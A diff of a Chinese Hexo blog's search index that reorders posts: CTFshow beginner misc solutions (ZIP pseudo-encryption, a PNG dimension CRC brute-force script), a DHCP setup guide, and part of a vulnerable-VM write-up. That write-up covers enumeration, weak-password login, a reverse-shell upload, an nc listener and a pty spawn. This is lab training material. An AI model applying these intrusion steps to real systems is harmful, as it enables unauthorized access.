@@ -114,41 +114,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTFshow 萌新区杂项1-11</title>
-    <url>/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/</url>
-    <content><![CDATA[<p>CTFshow刷题合集之萌新杂项~</p>
-<h2 id="萌新区-杂项1"><a href="#萌新区-杂项1" class="headerlink" title="萌新区 杂项1"></a>萌新区 杂项1</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.1.png"></p>
-<span id="more"></span>
-<p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.2.png"><br>hint直接给答案可还行</p>
-<h2 id="萌新区-杂项2"><a href="#萌新区-杂项2" class="headerlink" title="萌新区 杂项2"></a>萌新区 杂项2</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.2.png"><br>没啥好讲的 记事本看也行</p>
-<h2 id="萌新区-杂项3"><a href="#萌新区-杂项3" class="headerlink" title="萌新区 杂项3"></a>萌新区 杂项3</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/3.1.png"><br>信息就那么几个：97 10 01 15<br>银行卡密码6位数 试几次就行了<br>密码为 971015</p>
-<h2 id="萌新区-杂项4"><a href="#萌新区-杂项4" class="headerlink" title="萌新区 杂项4"></a>萌新区 杂项4</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/4.1.png"><br>给的信息够多了 直接生成个字典暴力破解就行</p>
-<h2 id="萌新区-杂项5"><a href="#萌新区-杂项5" class="headerlink" title="萌新区 杂项5"></a>萌新区 杂项5</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.1.png"><br>乍一看没什么头脑（这种情况也就刚拿到题目一分钟左右）<br>很快就可以发现大写分布是不规律的 尤其是country的o是个0（数字）<br>我们把大写的字母一个一个挑出来 就会发现是答案<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.2.png"><br>flag{ctfshownb} 没什么难度，抖机灵的题</p>
-<h2 id="萌新区-杂项6"><a href="#萌新区-杂项6" class="headerlink" title="萌新区 杂项6"></a>萌新区 杂项6</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.1.png"><br>很明了，考察的是伪加密<br>先查找50 4B 01 02<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.2.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.3.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.4.png"><br>改过之后即可解压成功<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.5.png"><br>PS:50 4B 03 04：这是头文件标记（0x04034b50）</p>
-<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
-<p>伪加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
-<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
-<h2 id="萌新区-杂项7"><a href="#萌新区-杂项7" class="headerlink" title="萌新区 杂项7"></a>萌新区 杂项7</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.1.png"><br>感觉是改宽高的题<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.2.png"><br>确实是改宽高的题   我觉得这种题过不了正规比赛的审（单纯指图片）<br>找到图片的src，然后进行爆破  src跟在宽高后面<br>怎么知道宽高在哪儿？一个很朴素的办法就是先看图片的属性 然后转十六进制 就酱<br>你不得不承认这是种办法  只不过听了有种想打我的冲突而已23333<br>最最原始且朴素的找宽高的办法哈哈哈哈<br>反正正常做法都清楚 我就不写了<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.3.png"><br>然后改一下就行了  细节不展示了<br>最后，贴一下爆破宽高的脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">k=0</span><br><span class="line">for i in range(5000):</span><br><span class="line">    if k==1:</span><br><span class="line">        break</span><br><span class="line">    for j in range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        if crc == 0x889c2f07:</span><br><span class="line">            k = 1</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<h2 id="萌新区-杂项8"><a href="#萌新区-杂项8" class="headerlink" title="萌新区 杂项8"></a>萌新区 杂项8</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.1.png"><br>是这样的，题做出来了 跟杂项7是一样的<br>但是我懒得写笔记了 所以这里应付一下（）<br>就跟杂项7的做法一样，上脚本爆破<br>只需要改一下crc就行了 灰常简单~<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.2.png"></p>
-<h2 id="萌新区-杂项9"><a href="#萌新区-杂项9" class="headerlink" title="萌新区 杂项9"></a>萌新区 杂项9</h2><p>爷不会</p>
-<h2 id="萌新区-杂项10"><a href="#萌新区-杂项10" class="headerlink" title="萌新区 杂项10"></a>萌新区 杂项10</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.2.png"><br>看不出来所以然 看了眼题目摘了眼镜 有点懵逼<br>猜了一下好像是我好喜欢你<br>做题方法：缩小图片并摘下眼镜  (#^.^#)眼快瞎了嗷</p>
-<h2 id="萌新区-杂项11"><a href="#萌新区-杂项11" class="headerlink" title="萌新区 杂项11"></a>萌新区 杂项11</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.2.png"><br>上传文件之后点seek 密码为空直接点OK打开后发现是一个二维码<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.3.png"><br>是这样的，我扫了一下，然后出来了大吉大利杯的宣传视频，然后末尾还有个这么个东西……<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.4.png"><br>我……  好吧  我先去找一圈wp<br>大佬用的是QR_Research<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.5.png"><br>接下来来base64解码即可<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.6.png"><br>又是被flag笑到的一天</p>
-<hr>
-<blockquote>
-<p>只要心还透明，就能折射希望。</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>CTFshow刷题合集</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTFshow 萌新web1-8</title>
     <url>/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/</url>
     <content><![CDATA[<h2 id="萌新区web1"><a href="#萌新区web1" class="headerlink" title="萌新区web1"></a>萌新区web1</h2><p>web选手培养中……<br>CTFshow这个平台简直不要太赞，以后刷题就在这里了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.0.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.1.png"><br>既然没有漏洞那我就不做了吧（滑稽）<br>这个注释，可以说很照顾萌新了</p>
@@ -217,6 +182,41 @@
       </tags>
   </entry>
   <entry>
+    <title>CTFshow 萌新区杂项1-11</title>
+    <url>/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/</url>
+    <content><![CDATA[<p>CTFshow刷题合集之萌新杂项~</p>
+<h2 id="萌新区-杂项1"><a href="#萌新区-杂项1" class="headerlink" title="萌新区 杂项1"></a>萌新区 杂项1</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.1.png"></p>
+<span id="more"></span>
+<p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.2.png"><br>hint直接给答案可还行</p>
+<h2 id="萌新区-杂项2"><a href="#萌新区-杂项2" class="headerlink" title="萌新区 杂项2"></a>萌新区 杂项2</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.2.png"><br>没啥好讲的 记事本看也行</p>
+<h2 id="萌新区-杂项3"><a href="#萌新区-杂项3" class="headerlink" title="萌新区 杂项3"></a>萌新区 杂项3</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/3.1.png"><br>信息就那么几个：97 10 01 15<br>银行卡密码6位数 试几次就行了<br>密码为 971015</p>
+<h2 id="萌新区-杂项4"><a href="#萌新区-杂项4" class="headerlink" title="萌新区 杂项4"></a>萌新区 杂项4</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/4.1.png"><br>给的信息够多了 直接生成个字典暴力破解就行</p>
+<h2 id="萌新区-杂项5"><a href="#萌新区-杂项5" class="headerlink" title="萌新区 杂项5"></a>萌新区 杂项5</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.1.png"><br>乍一看没什么头脑（这种情况也就刚拿到题目一分钟左右）<br>很快就可以发现大写分布是不规律的 尤其是country的o是个0（数字）<br>我们把大写的字母一个一个挑出来 就会发现是答案<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.2.png"><br>flag{ctfshownb} 没什么难度，抖机灵的题</p>
+<h2 id="萌新区-杂项6"><a href="#萌新区-杂项6" class="headerlink" title="萌新区 杂项6"></a>萌新区 杂项6</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.1.png"><br>很明了，考察的是伪加密<br>先查找50 4B 01 02<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.2.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.3.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.4.png"><br>改过之后即可解压成功<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.5.png"><br>PS:50 4B 03 04：这是头文件标记（0x04034b50）</p>
+<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
+<p>伪加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<h2 id="萌新区-杂项7"><a href="#萌新区-杂项7" class="headerlink" title="萌新区 杂项7"></a>萌新区 杂项7</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.1.png"><br>感觉是改宽高的题<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.2.png"><br>确实是改宽高的题   我觉得这种题过不了正规比赛的审（单纯指图片）<br>找到图片的src，然后进行爆破  src跟在宽高后面<br>怎么知道宽高在哪儿？一个很朴素的办法就是先看图片的属性 然后转十六进制 就酱<br>你不得不承认这是种办法  只不过听了有种想打我的冲突而已23333<br>最最原始且朴素的找宽高的办法哈哈哈哈<br>反正正常做法都清楚 我就不写了<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.3.png"><br>然后改一下就行了  细节不展示了<br>最后，贴一下爆破宽高的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">k=0</span><br><span class="line">for i in range(5000):</span><br><span class="line">    if k==1:</span><br><span class="line">        break</span><br><span class="line">    for j in range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        if crc == 0x889c2f07:</span><br><span class="line">            k = 1</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<h2 id="萌新区-杂项8"><a href="#萌新区-杂项8" class="headerlink" title="萌新区 杂项8"></a>萌新区 杂项8</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.1.png"><br>是这样的，题做出来了 跟杂项7是一样的<br>但是我懒得写笔记了 所以这里应付一下（）<br>就跟杂项7的做法一样，上脚本爆破<br>只需要改一下crc就行了 灰常简单~<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.2.png"></p>
+<h2 id="萌新区-杂项9"><a href="#萌新区-杂项9" class="headerlink" title="萌新区 杂项9"></a>萌新区 杂项9</h2><p>爷不会</p>
+<h2 id="萌新区-杂项10"><a href="#萌新区-杂项10" class="headerlink" title="萌新区 杂项10"></a>萌新区 杂项10</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.2.png"><br>看不出来所以然 看了眼题目摘了眼镜 有点懵逼<br>猜了一下好像是我好喜欢你<br>做题方法：缩小图片并摘下眼镜  (#^.^#)眼快瞎了嗷</p>
+<h2 id="萌新区-杂项11"><a href="#萌新区-杂项11" class="headerlink" title="萌新区 杂项11"></a>萌新区 杂项11</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.2.png"><br>上传文件之后点seek 密码为空直接点OK打开后发现是一个二维码<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.3.png"><br>是这样的，我扫了一下，然后出来了大吉大利杯的宣传视频，然后末尾还有个这么个东西……<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.4.png"><br>我……  好吧  我先去找一圈wp<br>大佬用的是QR_Research<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.5.png"><br>接下来来base64解码即可<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.6.png"><br>又是被flag笑到的一天</p>
+<hr>
+<blockquote>
+<p>只要心还透明，就能折射希望。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>CTFshow刷题合集</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>靶机Cheesey:Cheeseyjack渗透记录</title>
     <url>/2021/07/22/Cheesey-Cheeseyjack/</url>
     <content><![CDATA[<p>本来懒得写，但是写完搜了一下发现这个靶机的笔记比较少，就发出来供大家参考。<br>本人巨菜，轻喷。</p>
@@ -238,7 +238,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/project_management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/07/22/Cheesey-Cheeseyjack/12.png"><br>访问一下。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/13.png"><br>在databases.yml发现了点信息。不管有用没有，收集起来再说。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/14.png"><br>试着用enum4linux看看能不能收集到啥【enum4linux是Kali Linux自带的一款信息收集工具】</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.55.134</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#x63;&#104;&#x33;&#51;&#x73;&#51;&#x6d;&#x34;&#110;&#64;&#x63;&#x68;&#101;&#101;&#115;&#101;&#121;&#x6a;&#97;&#x63;&#x6b;&#46;&#108;&#111;&#x63;&#x61;&#108;">&#x63;&#104;&#x33;&#51;&#x73;&#51;&#x6d;&#x34;&#110;&#64;&#x63;&#x68;&#101;&#101;&#115;&#101;&#121;&#x6a;&#97;&#x63;&#x6b;&#46;&#108;&#111;&#x63;&#x61;&#108;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#99;&#104;&#51;&#x33;&#115;&#51;&#x6d;&#52;&#x6e;&#64;&#x63;&#104;&#x65;&#x65;&#x73;&#101;&#x79;&#106;&#97;&#99;&#x6b;&#46;&#108;&#111;&#99;&#97;&#108;">&#99;&#104;&#51;&#x33;&#115;&#51;&#x6d;&#52;&#x6e;&#64;&#x63;&#104;&#x65;&#x65;&#x73;&#101;&#x79;&#106;&#97;&#99;&#x6b;&#46;&#108;&#111;&#99;&#97;&#108;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/07/22/Cheesey-Cheeseyjack/20.png"><br>刚才收集到了uploads文件夹，找到shell.php点击即可。<br>![](21 (2).png)<br><img src="/2021/07/22/Cheesey-Cheeseyjack/21.png"><br>因为自带有python3环境【可以用which python找路径】<br>所以这里还可以打一个反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
@@ -260,6 +260,47 @@
       </categories>
       <tags>
         <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RedHat7 DHCP服务器配置</title>
+    <url>/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[<p>社团作业 没有难度</p>
+<blockquote>
+<p>DHCP（动态主机配置协议）是一个局域网的网络协议。指的是由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。担任DHCP服务器的计算机需要安装TCP/IP协议，并为其设置静态IP地址、子网掩码、默认网关等内容。</p>
+</blockquote>
+<span id="more"></span>
+<h2 id="创建挂载点"><a href="#创建挂载点" class="headerlink" title="创建挂载点"></a>创建挂载点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/cdrom</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png"></p>
+<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/dev.repo</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dvd]</span><br><span class="line">name = dvd</span><br><span class="line">baseurl = file:///mnt/cdrom</span><br><span class="line">gpgcheck = 0</span><br><span class="line">enabled = 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置IP"><a href="#配置IP" class="headerlink" title="配置IP"></a>配置IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png"></p>
+<h2 id="关闭selinux和防火墙"><a href="#关闭selinux和防火墙" class="headerlink" title="关闭selinux和防火墙"></a>关闭selinux和防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">getenforce</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png"></p>
+<blockquote>
+<p>DHCP工作流程：<br>1 客户端发送广播向服务器申请IP地址<br>2 服务器收到请求后查看主配置文件dhcpd.conf，先根据客户端的mac地址查看是否为客户端设置了固定的IP地址<br>3 如果为客户端设置了固定的IP地址，则将该IP地址发送给客户端。如果没有设置固定IP地址，则将地址池中的IP地址发送给客户端。<br>4 客户端收到服务器回应后，客户端给与服务器回应，告诉已经使用了分配的IP地址。<br>5 服务器将相关租约信息存入数据库</p>
+</blockquote>
+<h2 id="安装DHCP"><a href="#安装DHCP" class="headerlink" title="安装DHCP"></a>安装DHCP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install dhcp</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/dhcp/dhcpd.conf</span><br></pre></td></tr></table></figure>
+<h2 id="修改dhcpd-conf-主配置文件"><a href="#修改dhcpd-conf-主配置文件" class="headerlink" title="修改dhcpd.conf 主配置文件"></a>修改dhcpd.conf 主配置文件</h2><p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/6.png"><br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/7.png"><br>将另一台虚拟机配置为DHCP自动获取IP<br>关闭VMware软件自带的DHCP功能<br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/8.jpg"></p>
+<h2 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart dhcpd</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/9.png"></p>
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>打开另一台虚拟机（Linux/windows），网卡改成vmnet8，把IP地址调成自动获取（dhcp），然后重启网络服务器。然后IP就应该自动获取了。<br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/10.jpg"><br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/11.png"><br>这样就算完成了</p>
+<hr>
+<blockquote>
+<p>对深海的恐惧，对深海的向往，人类源自海洋，我们回不去的故乡。​</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>Linux学习记录</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -304,47 +345,6 @@
 <hr>
 <blockquote>
 <p>没有比人更高的山,没有比脚更长的路</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>Linux学习记录</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RedHat7 DHCP服务器配置</title>
-    <url>/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[<p>社团作业 没有难度</p>
-<blockquote>
-<p>DHCP（动态主机配置协议）是一个局域网的网络协议。指的是由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。担任DHCP服务器的计算机需要安装TCP/IP协议，并为其设置静态IP地址、子网掩码、默认网关等内容。</p>
-</blockquote>
-<span id="more"></span>
-<h2 id="创建挂载点"><a href="#创建挂载点" class="headerlink" title="创建挂载点"></a>创建挂载点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/cdrom</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png"></p>
-<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/dev.repo</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png"></p>
